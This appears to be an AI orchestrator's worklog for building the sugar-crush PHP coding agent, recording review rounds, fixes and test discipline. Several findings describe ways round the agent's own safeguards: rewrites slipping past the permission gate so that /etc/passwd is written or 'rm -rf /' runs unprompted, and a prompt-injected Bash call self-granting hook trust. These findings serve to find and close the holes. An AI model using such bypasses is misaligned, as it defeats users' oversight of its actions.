- "Nine built-in tools" matches what `Bootstrap` actually registers. `Write.php`
  is a tenth file on disk but deliberately unregistered (#44), so the page is
  right to omit it — and will need a line the day #44 is wired.
- `BashEscapeDenyHook` is on `HEAD`, so naming it is fine.

**Why it is held:** the page documents **`PermissionGateHook`** — "plus
`PermissionGateHook` last, which adapts the six-mode `PermissionGate` onto the
same chain" — and `ScriptHook` selecting allow/deny/modify/ask by exit code.
Both are **P1.2 deliverables and P1.2 is still uncommitted**:

```
$ git cat-file -e HEAD:sugar-crush/src/Hooks/BuiltIn/PermissionGateHook.php
fatal: path ... exists on disk, but not in 'HEAD'
```

Committing lane-D first would publish a docs page describing a class that is not
in the repository. So lane-D lands **with or after P1.2**, not before. This is
ordering, not a defect in the docs — the prose is accurate about the tree it was
written against.

**One real gap to close before it lands:** `SUGARCRUSH_BACKGROUND`
(`src/Tui/TerminalBackground.php:45`, `ENV_OVERRIDE`) is a user-settable knob
with **zero** mentions in `ENVIRONMENT.md`. It arrived with the UI lane
(`4e10360b`) after lane-D was written, so this is drift rather than an
oversight. The three `SUGARCRUSH_DISABLE_*` flags are all documented.

Deliberately **not** a gap: `CRUSH_TOOL_NAME` / `CRUSH_TOOL_INPUT` /
`CRUSH_TOOL_OUTPUT` / `CRUSH_SESSION_ID` / `CRUSH_MODEL` / `CRUSH_PROVIDER` are
undocumented, but they are variables sugar-crush **exports into hook scripts**,
not ones a user sets. They belong in the HOOKS authoring guide (#35), which is
blocked on #11 anyway. Filed rather than silently folded in.

### Three lanes running concurrently

| Lane | Item | Fence |
|---|---|---|
| review | **#11 P1.2 round 4** | read-only + hand-restored sabotages |
| fix | **#54** `AgentWorkerPool::executeAll()` hang | `src/Agents/AgentWorkerPool.php` + siblings only; `AgentManager.php` explicitly forbidden (P1.2 owns it) |
| fix | **#56** ExtUvLoop stale-clock | `candy-core` + `candy-testing`; **all** of `sugar-crush/` forbidden |

Lanes were picked for **file-disjointness from P1.2's uncommitted set**, not plan
order. #49 was the obvious third pick and was rejected on exactly that test: its
natural construction site is `AgentManager.php`, which P1.2 is holding.

---

## P1.2 review round 5 — MAJOR on the live path

Round 4 found the dispatcher computing a rewrite and discarding it. Round 5
found **the same bug surviving on the ASK path, in the live loop** — and unlike
round 4's, this one is the shipped chain's *normal* configuration.

### F1 (MAJOR) — a same-pass ASK silently discards that pass's rewrite

`src/Hooks/HookRegistry.php:203-212` + `:302-304`. `scan()` ranks ASK above
MODIFY, so when both come out of the **same** pass the pass ends as the ASK and
`$pendingModify` is dropped. `executeHooks()`'s ASK branch only re-attaches
`$modified` — a rewrite that settled on a *previous* pass. A rewrite made in the
same pass as the question never travels and is never re-scanned.

It is reachable by default because **`PermissionGateHook`'s ASK is mode-driven,
not argument-driven**: in Default mode `PermissionGate::evaluate()` asks on every
write tool whatever the arguments, so the gate asks on pass 1 and there is never
a pass 2.

```
hooks: sanitiser (Edit{file_path:"/etc/passwd"} -> Edit{file_path:"./build/out.txt"})
       permission-gate (PermissionMode::Default)
executeHooks()       => action=ask, modifiedInput = NULL     <-- rewrite gone
resolveAsk(approved) => action=allow, rewrittenArgs() = NULL
```

So `Runtime::settleAsk()` shows the approver `/etc/passwd` rather than
`./build/out.txt`, and on approval `rewrittenArguments()` falls back to the
originals and **writes `/etc/passwd`**. `Chat::gateToolCall()` is identical.
This is exactly the invariant round 3's carrying-ASK mechanism was built to
establish, defeated by the one chain shape nobody wrote a test for.

The existing `HookRegistryTest::testAskAfterModifyStillSuspendsTheCall:461`
drives this very chain and asserts only `isAsk()`/message/`!permitsExecution()`
— it never looks at `modifiedInput`, so the hole is unpinned in **either**
direction. The passing `testAnAskRaisedOverARewriteCarriesTheRewriteWithIt:558`
covers only the *argument-conditional* ask hook, i.e. the pass-2 case.

### F2 (MINOR) — a later inert rewrite discards an already-settled decodable one

`HookRegistry.php:232-245`. Distinct from round 3's documented
inert-runs-the-originals decision: `return $result;` in the inert branch also
throws away `$modified`, a rewrite the whole chain had already re-scanned and
agreed on. `HookDispatcher` keeps it on the identical chain — so the two loops
the change-set explicitly claims are aligned settle on different arguments, and
**the live one loses**. One-token fix: `return $modified ?? $result;`.

### F3, F4 — two more GREEN sabotages

- `determineExitCode()` reverts **wholesale** to its pre-round-4 body with the
  suite green (1170/3010). The `&& !$result->isAsk()` guard is the only
  behavioural content of round 4's fix and is load-bearing: `ScriptHook.php:183`
  builds an ASK from raw stdout, so a script printing `[exit-1] Proceed?` yields
  an ASK whose message starts with `[exit-1]` — without the guard the dispatch
  proceeds as if nothing was asked.
- `HookDispatcher::scan()`'s `&& $rewritten === null` guard deletes green.
  Doubly load-bearing: the last rewrite would win (diverging from the registry,
  whose twin `$pendingModify ??=` *is* covered), and because the assignment is
  `$rewritten = self::rewrite(...)`, a later **inert** rewrite overwrites a good
  `$rewritten` with `null`.

### F5, F6 — the centralization is one consumer short, and one site widened

`Runtime::asAsked()` still uses a bare `is_array($decoded)`, so it accepts the
top-level JSON list `rewrittenArgs()` exists to refuse — the approver is shown a
call that will not run, the inverse of round 3's invariant. And
`Chat::applyRewrite()` lost its `isModified()` gate while `Runtime` kept one, so
a plain ALLOW carrying a `modifiedInput` is now honoured by Chat and ignored by
Runtime, against `gateToolCall()`'s promise that the two mirror each other
decision for decision.

### What round 5 cleared

A (the `scan()` rule change) **cannot smuggle** — the winning rewrite is always
re-scanned by the whole chain including the gate before it can settle, so making
a later hook's rewrite win only ever exposes it to more judgement. The
`$pendingInertModify` fallback cannot loop (the inert branch returns
unconditionally, consuming no budget). `executeHooks()` has exactly two callers,
both in `HookManager`, so nothing depended on the old rule.

B is sound — `HookDispatchResult` and `HookContext` are both `final readonly`,
so the new `public HookContext $context` is genuinely immutable, and the
"no production consumer can see a non-null rewrite" claim was independently
verified (only `PreToolUse` populates it; the sole consumer, `Agents/TaskList.php`,
dispatches TaskCreated/TaskCompleted/TeammateIdle).

C is sound with **no fail-closed regression** — every action was enumerated
before and after; nothing that previously returned 0 was allowed, because
`isAllowed()`/`isModified()` `continue` before that method is reached.

D's `ltrim` question is clean: the two characters `ltrim` strips that JSON does
not accept (`\0`, `\x0B`) make `json_decode()` fail anyway, and a BOM is stripped
by neither — so both halves of the predicate agree by construction.

### Process fix — record sabotage labels in the tree

Round 5 could not re-run rounds 3/4's sabotages **by name** ("A7, B2, B4…")
because those labels live only in agent reports, and this worklog carries prose.
It reconstructed equivalents and got them all red, but that is re-derivation, not
verification. **Sabotage labels belong here from now on**, so a later round can
re-run the earlier ones exactly rather than approximately.

| Label | Mutation | Expected |
|---|---|---|
| A7 | dispatcher fixed-point settle returns the **pre**-rewrite context | RED |
| A7b | no-modify settle → always plain `allow()` | RED |
| S2 | registry back to `$pendingModify ??= $result` | RED |
| S3 | drop the ASK tag in `scan()` | RED |
| S3b | `determineExitCode()` fallback widened to `EXIT_DENY` | RED |
| S6 | `rewrittenArgs()` drops the `{`-check | RED |
| B2 | concurrent path drops `gate()`'s third element | RED |
| B4 | delete `applyRewrite` from Chat's ASK branch | RED |
| SC1 | `determineExitCode()` reverted wholesale | **GREEN — F3** |
| SE1 | `HookDispatcher::scan()` drops `&& $rewritten === null` | **GREEN — F4** |

### Concurrency

Dropping to **one agent at a time** once the two in flight (#54 fix, #56 fix
round 2) land. The shared worktree has been costing real signal: cross-lane
`pkill -f phpunit` and `pkill -f 'php -r'` killing each other's runs (one lane
disclosed ~13 such windows), and `candy-core/src/Program.php` sabotage windows
visible to sugar-crush through its `vendor/` path symlink. Serial lanes mean a
failing test means what it says.

---

## Session close — 5 change-sets landed

| SHA | Item |
|---|---|
| `e1881baf` | **#57** VertexProvider — 4 defects + a 60s cap truncating completions |
| `9d92bb5a` + `5af648a9` | **#46** PathJail unification (turned out to be a security fix) |
| `4e10360b` | **#37** P8.1/P8.5 diff gutter + adaptive theme + tab overflow |
| `a2606c7f` | **#56** libuv stale-clock trap documented; `LoopPin` in candy-testing |
| `69d58867` | **#54** AgentWorkerPool hang (not intermittent — 100% with a latent trigger) |
| `df0a563b` | **#11 P1.2** permission gate as a real hook |
| `c182a309` | **#34 P7.1/2** docs site page + `ENVIRONMENT.md` |

### P1.2 took seven rounds, and the reason is worth recording

Rounds 4, 5 and 6 each found a MAJOR, and all three were **the same defect
family**: a rewrite reaching the tool without the chain having judged it. Three
different routes —

1. `HookDispatcher` computed the rewrite and discarded it.
2. A **same-pass ASK** dropped that pass's rewrite. Reachable **by default**:
   `PermissionGateHook` asks on *mode*, not arguments, so the gate asks on pass 1
   and there is never a pass 2. Approver shown `./build/out.txt`; approving wrote
   `/etc/passwd`.
3. An **ASK carrying its own rewrite** bypassed the re-scan entirely, because
   `scan()` only recorded a rewrite when `isModified()`. On the shipped chain
   that ran `rm -rf /` past `ConfirmRemoveHook`, and on Chat's path a prior
   "always" grant dispatched it **with no prompt at all**.

Round 6's fix is why round 7 came back clean: it stopped patching routes and made
**where a rewrite came from stop deciding whether the chain sees it**. `scan()`
no longer ranks; `executeHooks()` owns precedence; an ASK's rewrite becomes a
proposal on the MODIFY path. Round 7's convergence argument — there is exactly
one variable that can leave the loop carrying a rewrite, assigned in one
statement, guarded by `rewrittenArgs() !== null` — is the first structural reason
to believe the class is closed rather than the next variant merely unfound.

**The lesson for the remaining queue:** when two consecutive rounds find the same
*shape* of bug by different routes, stop fixing routes. The cheap fix in round 6
was a one-liner; the fix agent measured that it closed the fail-open by
*silently discarding the sanitisation* — the same harm, one layer down — and took
the structural option instead. That judgement is what ended the chain.

### What kept paying

- **Ask fix agents which sabotages came back GREEN.** Six real coverage holes
  this session were self-reported by the agent that wrote the code, including
  two where the agent's own new test was vacuous.
- **Re-run the reported sabotage personally before committing.** Every commit
  above was verified that way, not on report.
- **Record sabotage labels in the tree.** Two rounds lost labels and had to
  reconstruct mutations, which is re-derivation, not verification. The round-3
  driver's fix — assert each anchor is unique and print `SKIP` rather than a
  false GREEN — is the mechanism that should have existed from the start.
- **A third agent adjudicates a measurement dispute.** #56's reviewer and fixer
  disagreed on libuv's mechanism; both were partly right, and the adjudicator
  found a MAJOR neither had.

### Concurrency

Ran at 3 lanes, then 2, now 1–2 by request. The shared worktree cost real
signal: cross-lane `pkill -f phpunit` and `pkill -f 'php -r'` (one lane disclosed
~13 such windows), and `candy-core/src/Program.php` sabotage windows visible to
sugar-crush through its `vendor/` path symlink. Every agent brief now bans
pattern-matched kills and requires PID-targeted bounds.

### Open

**#37** P8.6 VHS demos and the `TerminalBackground::observe()` wiring into
`App/App.php`. **#44** `Write` still deliberately unregistered in
`Bootstrap::tools()`. New this session: **#62** (candy-pty/candy-mosaic/candy-async
are confirmed stale-clock victims, now unblocked), **#63** (`phpunit.xml` sets no
`enforceTimeLimit`, so the mock-executor half of the pool suite can still wedge
CI). Still queued: **#58–#61**, and the P2–P8 body of the plan.

---

# RESUME HERE — self-contained state (2026-08-14)

Everything needed to continue without the originating conversation. The plan
itself is `crush_code.md`; its new "Execution status" header lists which items
are done and, importantly, **which are only partly done despite carrying a ✅**.

## Standing rules (from the user — these govern every step)

1. **The loop, per plan step:** implement (agent) → **separate** agent reviews
   the diff → findings? fix agent → **back to review** → clean? run the suite →
   **commit directly to `master`**. No branches, no PRs.
2. **Never delete a feature because it looks incomplete or dead.** Complete it,
   or document it as an intentional dormant seam. The audit contains several
   "delete this" recommendations from its own research agents that were
   overridden for exactly this reason; honor that override.
3. **Do not run `caliber` anything.** A stop hook nags about Caliber not being
   set up on this machine — expected, the user has opted out. Don't run it and
   don't keep re-asking.
4. **Fix, don't disable.** Root-cause fixes, never disable-and-TODO fallbacks.
5. **Never a blanket total-request timeout on an LLM provider HTTP client** — a
   completion can legitimately run tens of minutes. A short `connect_timeout`
   only.
6. Conventions: `declare(strict_types=1);` first line, PSR-12, PHP 8.3+, `final`
   unless extension is the contract, immutable+fluent `with*()` via `mutate()`,
   bare accessors (no `get`), comments explain WHY not WHAT.
7. Stale per-lib `vendor/`/`composer.lock` cause false local failures —
   `composer update` in that lib before believing one.

## Do NOT touch

- `SystemPromptWiringTest::testARealChatKeystrokeTurnDeliversBothHalves` —
  pre-existing timing flake. Don't skip it, don't weaken its assertion.
- `McpClientTest::testLoadConfigReturnsEmptyArrayWhenFileGetContentsFails` —
  the one legitimate skip.
- This lib is **not** `php-cs-fixer`-clean repo-wide; don't normalize unrelated
  files.
- `docs/plans/plans_cleaning.md` and `sugar-crush/python_port/` are untracked
  user work.
- The working tree may carry real uncommitted work: **never** `git checkout .`,
  `git reset`, `git stash`, or `git clean`.

## Harness hazards learned the hard way this session

These cost real signal and are not obvious. Put them in every agent brief.

- **Never use a pattern-matched kill.** `pkill -f phpunit` AND
  `pkill -f 'php -r'` are both banned — `ProcessExecutor` spawns its workers as
  `php -r`, so the second pattern kills other lanes' workers. One lane disclosed
  ~13 such windows that corrupted another lane's runs. Bound with
  `timeout -s KILL` on your own child, or capture the PID.
- **Never run phpunit through Python's `subprocess.run(capture_output=True)`** —
  `tests/Cli`/`tests/Sessions` spawn detached children that inherit the pipe, so
  the call blocks forever on a pipe phpunit already released. Write to a file.
- **`candy-core/src/Program.php` sabotage is visible to `sugar-crush`** through
  its `vendor/` path symlink. Keep cross-lib sabotage windows short.
- **`sugar-crush/phpunit.xml` sets no `enforceTimeLimit`** (task #63), so an
  unbounded test wedges the whole suite instead of failing it.
- Treat any run that dies 143/144, or fails outside the lane's own files, as
  **signal-free** — re-run narrower before concluding anything.

## Method that repeatedly found real bugs

- **Ask the fix agent which sabotages came back GREEN**, and re-run them
  yourself before committing. Six real coverage holes this session were
  self-reported this way, including two where the agent's own new test was
  vacuous.
- **Record sabotage labels in the tree, not just in agent reports.** Two rounds
  lost labels and had to reconstruct mutations — re-derivation, not
  verification. The round-3 driver's discipline is the one to copy: assert each
  mutation anchor is unique before applying, and print `SKIP` rather than a
  false GREEN.
- **When two consecutive rounds find the same *shape* of bug by different
  routes, stop fixing routes.** This is what ended P1.2's seven-round chain.
- **A third agent adjudicates a measurement dispute.** #56's reviewer and fixer
  disagreed about libuv; both were partly right and the adjudicator found a
  MAJOR neither had.
- Pick concurrent lanes by **file-disjointness from the uncommitted set**, not
  plan order.

## Open work, in the order I'd take it

1. **#62** — pin the loop in candy-pty, candy-mosaic, candy-async. Unblocked by
   `a2606c7f`; three confirmed victims with file:line evidence in the task.
   Cheapest real win on the board.
2. **#63** — `enforceTimeLimit`. Small, and it protects every future lane.
3. **#37 (P8.6)** — VHS demos, plus `TerminalBackground::observe()`'s two
   additive `App/App.php` edits. **Do not** flip candy-shine's
   `lineNumbers: true` until candy-shine has a measurable separator — it joins
   its gutter with a literal tab and would reintroduce over-wide rows in every
   markdown code fence.
4. **#15** — `HookManager::loadFromFile()`, newly unblocked by `df0a563b`.
5. **#12/#13/#14/#16/#17** — the rest of Phase 2 wiring.
6. **#64** — P1.2's five non-blocking notes; N3 (give `Runtime`'s unreachable
   `isModified()` gate the same docblock+direct-test treatment F5a got) is the
   one I'd actually do.
7. **#58/#59/#60/#61**, **#49**, **#51**, **#55**.

## Sabotage drivers — GONE

The drivers used across P1.2 rounds 3-7 lived in `/tmp` (`sabotage.py`,
`/tmp/r6/sabotage6.py`, `/tmp/r7/sabotage7.py`, `/tmp/r7/sabotage8.py`) and
`sugar-crush/.r3-sabotage/` (deleted after #54 landed). **None survive a
reboot.** If a P1.2 regression is ever suspected, re-derive labels from the
findings recorded in this worklog rather than trusting those paths.

---

# Session 2026-08-14 → 2026-08-17 — 3 change-sets landed, lane B still open

Ran 3 concurrent lanes through plan items using the standing loop (implement →
separate reviewer → fix → **back to review** → clean → full suite → commit to
`master`). The user reduced concurrency to 1 mid-session over API budget, then
restored it to 3. **The dominant finding of the session: the same class of
defect — a comment stating a fact nobody had measured — was caught in every
single review round across all three lanes, nine times in total.**

## Landed

| commit | what |
|---|---|
| `c0ae2fdc` | sugar-crush: OSC 11 terminal background query; precedence is override → OSC 11 → `COLORFGBG` → dark |
| `d1e0f2b1` | sugar-crush: wire the hooks + skills subsystems into the live runtime (63 files, +6084/−263) — closes **#15/#16** |
| `76f34813` | candy-pty/candy-mosaic/candy-async: pin the loop in the test bootstraps (16 files) — closes **#62** |

## Lane C (#15/#16, hooks + skills wiring) — 6 rounds, landed as `d1e0f2b1`

Rounds 1-3 are recorded above. Rounds 4-6 this session:

**Round 3 closed four HIGHs, all independently re-exploited and confirmed by
round 4's reviewer**: C1 `/tmp/.sugar-crush/hooks.yaml` loaded ungated (`/tmp`
is 1777 → any local user plants arbitrary command execution); C2 a symlink in a
project skill tree (`{repo}/.claude/skills/escape -> $HOME`) putting home files
into model-reachable prompt context; C3 `trustedProjectHooks: ["."]` trusting
every repo; C4 Ctrl+P dropping the project hook chain mid-session.

**Round 4 found the real hole, one layer up — B1, the trust gate was
self-grantable by the agent it gates.** `trustedProjectHooks` lives in
`~/.sugar-crush/config.json`; default mode is `bypass-permissions`; `Bash` is
deliberately not path-jailed; and `ProtectFilesHook` covered `.env` /
`composer.json` / `.git/config` but **not** `.sugar-crush/hooks.yaml` or
`config.json`. One prompt-injected `Bash` call appends the repo's own path to
the allowlist, and because C4's fix (correctly) made Ctrl+P re-read both files,
the repo's shell runs mid-session with no relaunch and no prompt. Created by
this change-set: before #15/#16 nothing read those files, so writing them was
inert.

**Round 5's fix used two independent defences**, because a substring match on a
Bash command is not a boundary:
- *Write side* — policy files and the agents dir join the protected patterns,
  matched against both the given spelling and the canonical path (resolving the
  file, or parent+basename when it does not exist yet), so a symlink at either
  the file or its directory is caught.
- *Read side*, which is the actual fix — `trustedRootsForThisProcess()` resolves
  trust **once per process**; `hookFileEntries()` reads each hook file **once
  per launch** and replays parsed entries into every manager. A grant written
  during a session cannot take effect in it. Plus `requirePrivatePolicyFile()`
  refusing world-writable or foreign-owned policy files (group-writable
  deliberately allowed — Debian/Ubuntu ship umask 002 with user-private groups).

**Admitted residual, stated not buried**: a write that survives the deny takes
effect on the *next* launch, and that cannot be closed from here — a session
that runs shell as the user can leave anything in the user's home. The narrower
claim the gate now makes is *the trust decision is the user's, made before the
untrusted content runs, not by it and not while it runs*. A per-directory trust
**prompt** is what closes the relaunch case; the seam is sketched in
`hookFiles()`'s docblock.

**Round 5 review: no blocking findings, recommend commit.** Could not re-exploit
B1 — 18 write-side spellings all deny (including the parent+basename branch: a
not-yet-existing file under a symlinked config *directory*); forcing the grant
through with direct `file_put_contents` still kept the hook out of the next
in-process manager. Three should-fixes survived:
- **S-1 `HookDispatcher::matcherMatches()` was an un-fixed second copy.** Same
  registry, same hook, `matcher: 'Read|Write/Edit'` on tool `Write/Edit` →
  registry DENY, dispatcher **allow**. It missed both round-5 changes. Two
  comments asserted the opposite, including one claiming "ONE definition" while
  a second implementation sat one class over. Fixed by routing it through the
  same `HookConfig::pattern()` helper — which made the comments true rather than
  needing rewording.
- **S-3 the new `Read` deny was collateral.** Denying *write* on policy files is
  the point; denying *read* buys nothing (reading a policy file grants no
  capability) and blocked inspection of three tracked presets in this repo. Read
  is now allowed; write still denied.
- **S-2 `config.dev.json`** → filed as **#76**, pre-existing.

**Round 6 verification: COMMIT.** Re-derived all four comment claims from source
rather than from report — including compiling both regex strings to prove the
`DELIMITERS` correction right — re-ran five sabotage mutations (all RED), and
confirmed the `Read` carve-out is exactly `=== 'Read'` on the normalised name so
it leaks to nothing like `ReadFile` or `mcp__fs__Read`. Caught that the fix
agent's own summary table had one cell backwards (the backtrack case was `allow`
before, not `BLOCK`) — prose error, not code.

**Kept `HookDispatcher::matcherFailures()`** (added beyond brief): the new
fail-closed arm creates a failure with nowhere else to go, since the registry's
log is private and only written from a path a dispatch never calls.

**Real workflow consequence**: this repo's three tracked `.sugar-crush/agents/*.md`
presets are now un-editable by the agent through Edit/Write, same as
`composer.json` already was. Intended — presets carry `permissionMode` — but it
will be felt by anyone developing presets through the CLI.

## Lane A (#62, loop pinning) — 5 rounds, landed as `76f34813`

The mechanism was settled early and confirmed repeatedly; **every round's finding
was about the accuracy of the prose, not the code.** Six consecutive wrong
explanations before this session, then:

- **Round 3's failure mode was the subtlest**: correct numbers attached to the
  **wrong tests**. Both endpoint tests named in the comment were wrong — one
  settles synchronously behind an `if (!$settled)` guard and arms nothing, the
  other is a five-statement `assertNotSame` that never enters the loop.
- **Round 4 blocked on a 4-sample snapshot presented as a range**: committed
  `0.96-1.02s / 19-20%`, reviewer's 10 runs gave `0.79-1.16s / 15.8-23.1%`, only
  2 of 10 inside. Notably the *previous* text (`0.70-1.01s`) bracketed reality
  better — the round-3 revision moved **away** from the truth.
- **Round 5's fix ran 21 runs: 0 of 21 inside the committed band**, one
  collapsing to 0.26s headroom (5% of a 5s cap) with no code change. All
  single-run timestamps deleted; the comment now commits the *shape* plus a
  re-derivation recipe.
- **Round 5 review found the last blocker myself-fixable**: the brand-new
  `candy-pty/tests/bootstrap.php` claimed *both* its named tests survive only by
  run-order luck. `SignalForwarderReactLoopTest` measured **green at 30s** of
  injected staleness in both shapes — its assertion is already satisfied by
  synchronous pcntl dispatch before `run()` is entered. And the cited mechanism
  did not exist: there is no preceding shared-loop toucher, because
  `PtyPoolReactLoopTest` is the **first** toucher in all 606 tests. What actually
  protects it is that it *constructs* the loop (fresh clock).

**The mechanism, as finally stated correctly** (worth keeping — six rounds got
this wrong):
- Uniform staleness makes every armed timer overdue at once, but libuv fires the
  overdue batch **in deadline order**, so a test whose under-test timer was armed
  pre-run alongside its own bound still does its work first. Debounce and
  throttle pass against a **ten-second** stale clock.
- The real exposure is *a test whose remaining work depends on a timer armed
  **after** the loop starts running*. Sweeping all 22 `AsyncOpsTest` tests at 3s
  stale, **exactly two fail** — the two needing a second retry attempt, because
  retry's backoff #2 is armed from inside a callback after the first poll
  refreshed the clock, while the bound is still on the stale reckoning.
- candy-pty's exposed case is `PtyPoolReactLoopTest::testRapidCycleInsideLoop-
  DoesNotLeakSignals` alone: its 5s cap is armed *after* the 0.01s periodic, so
  it flips between **4.5s (pass) and 4.8s (fail)** of staleness — the cap less
  the ~0.2s the 20 iterations need. Failure mode is `iterations == 1`, not zero.
- The retry flip boundary is **0.48s** — the 0.5s bound less the delay of the
  backoff armed after `run()` enters — not 0.5s. Injected idle ≠ staleness;
  ~0.04s of PHPUnit start-up sits between them.

**Method note worth copying**: the mosaic comment now carries **two independent
21-run samples** (`0.26-1.06s` and `0.86-1.15s`) that disagree at both ends. Two
samples on one quiet machine disagreeing is the actual proof that only the shape
is durable — it makes the argument stronger, not weaker.

## Lane B (#37, VHS tapes + examples) — 8 rounds, STILL OPEN

**The premise inverted early.** I had reported the tapes as "inert in CI" —
false. `.github/workflows/vhs.yml`'s `render` job carries a ~49-lib matrix
**including `sugar-crush`**, runs upstream `vhs` from the lib's own directory,
and its output is what the commit job stages (`git add */.vhs/*.gif`). The
`vhs-candy-vcr` job is `lib: [candy-core]` **only**, a non-blocking soak whose
output is never committed. So: locally render with candy-vcr (user's standing
instruction), but **every tape is executed by upstream vhs in CI**, and a bad
directive reddens the whole job.

**Three CI-breaking defects were found and fixed** (all confirmed against the
real binary): `Set Shell "sh"` — a candy-vcr concept upstream validates against
nine fixed keys and hard-errors on; repo-root-relative typed paths (CI runs from
the lib directory); and a bare `Output x.gif` landing outside the artifact glob.
`vhs validate` exits **0** on all three, so it is not a backstop.

**The parser was wrong in FOUR consecutive rounds** — each round closed the
spelling the previous reviewer named and left a new one open, each time with the
suite green while vhs aborts the job:
1. column-0-plus-one-space anchoring → missed `  Set Shell "sh"` (indented) and
   `Set  Shell "sh"` (double space)
2. line-anchored regex → missed `Sleep 500ms Set Shell "sh"` (**multi-directive
   lines, which this repo's own tape convention uses**: `Down Sleep 200ms`)
3. first-argument-only → missed `Type "php " "examples/x.php"` (vhs **joins**
   consecutive quoted arguments)
4. **line-by-line iteration → missed values on the next line.** vhs has **no
   newline token**; its stream flows across lines, so `Set Shell`⏎`"sh"` is a
   valid render-killing directive. Same for `Source`⏎`file.tape`, which
   bypasses the whole suite.

Round 8 finally replaced it with a **whole-file token stream** with a keyword
terminator set and space-joined values.

**The keyword set was measured, not recalled** — this is the good work of the
session. Probe: `Type <word> zzqq` under `vhs validate`; `Type` swallows
non-keywords silently but a keyword leaves it with no string argument
(`Type expects string`). **Both lists vhs itself ships were rejected**: `vhs man`
omits `End`, `Env` and seven settings; the header `vhs new` writes omits twelve
more including `Wait`, `Source`, `Screenshot`, `Copy`, `Paste`, `Alt`, `Shift`.
Completeness was measured by running **773,501 candidates** (every CamelCase word
and every 2- and 3-segment combination appearing anywhere in the binary) through
the probe: exactly **53** hits, no 54th spelled in the binary.

**Self-reported sixth divergence, flagged not buried** — the prescribed model
("every following token until the next keyword, joined by spaces, across
newlines") is right for `Type` but **not uniform**:
1. `Set <setting>` takes exactly ONE token, keyword or not: `Set Shell zzz
   notakeyword` sets shell to `zzz` then errors on `notakeyword`.
2. vhs ends a value at the first **non-STRING** token, not only at a keyword — a
   bare number qualifies: `Type abc 123 def` types `abc` then errors on `123`.

Implemented the prescribed model anyway, arguing both over-approximate in the
**safe** direction (false alarm, never a miss) and both describe tapes vhs
already refuses to render. **Round 8's review is testing exactly that safety
argument** — the risk is a greedy value swallowing a token that was a directive
head the test needed to see (e.g. does `Output evil.gif` still assert if a
greedy `Set Shell` value swallows it?).

Also established this lane: `+` binds like `@`, so `Ctrl+O` and `Wait+Screen@5s`
are keyword heads that terminate a value. vhs has **no** multi-line strings
(`Type "echo abc`⏎`def"` types `echo abc def `, three strings joined). vhs's
lexer is **case-sensitive**. `#` ends a value anywhere outside a string with no
preceding space needed. No backslash escapes — a delimiter always ends a string.

Other lane-B substance, confirmed by two independent reviewers: the 117-column
height→grid table (six rows); `rowsNeeded` per tape (`cli`=22, `agents`=11,
`chat`=15, `permission`=15, `diff`=**20** — corrected from 19, where frames are
byte-identical through row 19); the `FixedAge` design (PHP `DateTimeImmutable`
**clones** on `modify()`/`add()`/`sub()`, so the docblock had it backwards and
the override silently ERASED arithmetic); the safety probes (no network, no files
created, the seeded `rm -rf build/` provably cannot execute because the batch is
empty); ~35 source citations; every factual assertion in all five tape headers.

The heartbeat fuse in `examples/agent-dashboard.php` was **defused, not
documented** — `ReflectionProperty` sets `lastHeartbeat` to `PHP_INT_MAX`
(verified no overflow: `time() - PHP_INT_MAX` stays a valid int; zero consumers
of the field).

## New tracker items filed this session

**#74** `AsyncOpsTest` leaks uncancelled 0.5s bound timers across tests — will
confound anyone re-measuring the stale-clock threshold the obvious way (a
per-test `PreparedSubscriber` produces failures **under the pin too**).
**#75** candy-mosaic hangs when stdout is a **pipe** (pre-existing, reproduces
under the old bootstrap) — and that is exactly how GitHub Actions runs it.
**#76** `config.dev.json` is provider policy sitting **inside** the Edit jail
(`vendor/sugarcraft/sugar-crush/`), reachable with no Bash at all — the
shortest-reach of the four policy files.
**#77** policy-file guards are case-sensitive (APFS/Windows); `sudo -E` now
hard-fails (right direction, bad message).
**#78** four `tests/McpClientTest.php` cases spawn a child that **exits
immediately** (`/bin/true`, `echo`) as their fake MCP server, then write the
129-byte `initialize` handshake to its stdin — a pure kernel race. Won it: `OK
(18 tests)`. Lost it: `fwrite(): Write of 129 bytes failed with errno=32 Broken
pipe` notice at `src/McpClient.php:170`, then `$written === false` throws at
:173. Three back-to-back runs of the untouched file went OK → error → OK, and it
reproduces in a standalone `php -r` with `proc_open('true')` and **zero
sugar-crush code loaded**. Fix is a child that stays alive (`cat`, `sleep`).
**#79** `/workflow run` **freezes the TUI**. `Chat.php:3727` calls
`WorkflowEngine::run()` synchronously inside `Chat::update()`, i.e. on the
ReactPHP loop, and `executeStage()` → `AgentWorkerPool::executeOne()` →
`ProcessExecutor::execute()` is a blocking `stream_select` until the worker
finishes or `SubAgent::$timeout` (default **300s**) expires — no repaint, no
keystrokes, no spinner, and `workflows/deep-research.php` is a 5-stage pipeline.
Created by P2.3: the path existed but could not be entered from the TUI before.
The repo already has the shape of the answer in `EngineBackend::completeAsync()`
(fork+socket). Deliberately NOT bundled into #13 — its own change-set.

**#80** `ProcessExecutor::createInlineWorkerScript()`
(`src/Agents/ProcessExecutor.php:507-643`) is **still the P1.S5 simulation** — the
worker echoes `[name] Task finished: <task>` and never makes a provider request.
So a workflow stage does not reach a live model, and no tool call exists on the
pool path for a `PermissionGate` to evaluate. Found while fixing #13's false
gate claim; it is the reason threading the gate could not by itself make that
claim true. Documented as a README limitation pending its own change-set.

**#81** port the vhs lexical grammar into `candy-vcr/src/Tape/Lexer.php`.
Upstream `vhs` is a transitional dependency — `candy-vcr` is meant to replace it
outright — but CI still renders the ~49-lib matrix with upstream (the
`vhs-runner` image in `.github/workflows/vhs.yml`), with candy-vcr as a
candy-core-only soak. Lane B derived the real token model from
`/home/my/go/pkg/mod/github.com/charmbracelet/vhs@v0.11.0`
(`lexer.go`/`token.go`/`parser.go`), and candy-vcr's lexer currently has
**neither a JSON token nor a regex token** — the two constructs behind rounds
10/11's three false greens. That knowledge is the spec candy-vcr needs, so it
must be recorded portably rather than spent on assertions.

Related trap, flagged to lane B: assertions that hold only because *upstream* is
the renderer must be **labelled**, never removed. `Set Shell` is the clear case —
a candy-vcr concept that upstream validates against nine fixed keys, where `sh`
is a hard error aborting the whole job (which is why the escape cases weaponise
it). Forbidding it in a tape is right today and wrong the day candy-vcr takes
over. Whoever flips the renderer needs to tell "this rule exists because of
upstream" from "this rule is a real contract of ours".

**#82** `src/Tui/Components/MenuBar.php:362-368` has the same orphaned-docblock
defect lane E fixed in `Renderer.php`: `activateMenu()`'s docblock sits above the
*next* method's docblock, and `activateMenu()` (`:469`) has none. Pre-existing and
unrelated to P8.2, so lane E left it rather than add diff noise. Two instances of
one defect means it is worth a grep across the lib, not a second point fix.

Worth recording *why* the zero-stage reachability test could not see #79: zero
